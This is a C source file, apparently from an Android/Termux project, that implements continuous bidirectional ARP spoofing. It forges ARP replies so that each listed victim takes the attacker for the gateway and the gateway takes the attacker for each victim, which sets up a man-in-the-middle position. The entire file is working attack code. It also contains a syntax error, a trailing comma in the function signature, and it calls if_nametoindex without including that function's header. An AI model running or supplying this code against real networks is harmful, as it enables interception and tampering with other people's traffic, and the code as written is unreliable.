/*
 * Copyright (c) 2026 SugaBlaz
 * This software is released under the MIT License.
 * https://github.com/SugaBlaz/PRJ_SUGA-27-ANDROID-TERMUX
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>

// --- Optimization: Struct to hold pre-parsed target data ---
// This avoids parsing IP strings inside the hot loop
typedef struct {
    uint32_t ip;
    uint8_t mac[6];
} target_t;

// Global flag for the loop
static volatile sig_atomic_t keep_running = 1;

void handle_sigint(int dummy) {
    (void)dummy;
    keep_running = 0;
}

// Helper to construct an ARP packet efficiently
void build_arp_packet(uint8_t *buffer, uint8_t *src_mac, uint32_t src_ip, uint8_t *dst_mac, uint32_t dst_ip) {
    struct ethhdr *eth = (struct ethhdr *)buffer;
    struct ether_arp *arp = (struct ether_arp *)(buffer + sizeof(struct ethhdr));

    // Ethernet Header
    memcpy(eth->h_dest, dst_mac, 6);
    memcpy(eth->h_source, src_mac, 6);
    eth->h_proto = htons(ETH_P_ARP);

    // ARP Header
    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(ETH_P_IP);
    arp->ea_hdr.ar_hln = 6;
    arp->ea_hdr.ar_pln = 4;
    arp->ea_hdr.ar_op  = htons(ARPOP_REPLY);

    // ARP Payload (Sender = You/Spoofed, Target = Victim)
    memcpy(arp->arp_sha, src_mac, 6);
    memcpy(arp->arp_spa, &src_ip, 4);
    memcpy(arp->arp_tha, dst_mac, 6);
    memcpy(arp->arp_tpa, &dst_ip, 4);
}

// Exported Function
int start_injection(
    const char *iface, 
    const char *gateway_ip_str, const char *gateway_mac_str,
    const char *attacker_mac_str, 
    target_t *targets, int target_count, 
) {
    
    keep_running = 1;
    signal(SIGINT, handle_sigint);

    // 1. Prepare Socket
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("[-] C: Socket failed");
        return -1;
    }

    unsigned int ifidx = if_nametoindex(iface);
    if (ifidx == 0) {
        perror("[-] C: Interface failed");
        close(sock);
        return -1;
    }

    // 2. Parse Constant Addresses (Gateway & Attacker)
    uint32_t gateway_ip = inet_addr(gateway_ip_str);
    uint8_t gateway_mac[6];
    uint8_t attacker_mac[6];
    sscanf(gateway_mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &gateway_mac[0], &gateway_mac[1], &gateway_mac[2], &gateway_mac[3], &gateway_mac[4], &gateway_mac[5]);
    sscanf(attacker_mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &attacker_mac[0], &attacker_mac[1], &attacker_mac[2], &attacker_mac[3], &attacker_mac[4], &attacker_mac[5]);

    // 3. Pre-allocate Buffers
    // We need a buffer for Victim->Attacker and Gateway->Attacker
    uint8_t packet[sizeof(struct ethhdr) + sizeof(struct ether_arp)];
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifidx;
    sll.sll_halen = 6;

    printf("[+] C: Starting Bi-Directional Spoof on %d targets.\n", target_count);

    while (keep_running) {
        for (int i = 0; i < target_count; i++) {
            // --- Packet 1: Tell Victim that I am the Gateway ---
            build_arp_packet(packet, attacker_mac, gateway_ip, targets[i].mac, targets[i].ip);
            memcpy(sll.sll_addr, targets[i].mac, 6);
            sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&sll, sizeof(sll));

            // --- Packet 2: Tell Gateway that I am the Victim ---
            build_arp_packet(packet, attacker_mac, targets[i].ip, gateway_mac, gateway_ip);
            memcpy(sll.sll_addr, gateway_mac, 6);
            sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&sll, sizeof(sll));
        }
    }

    printf("\n[+] C: Stopping injection.\n");
    close(sock);
    return 0;
}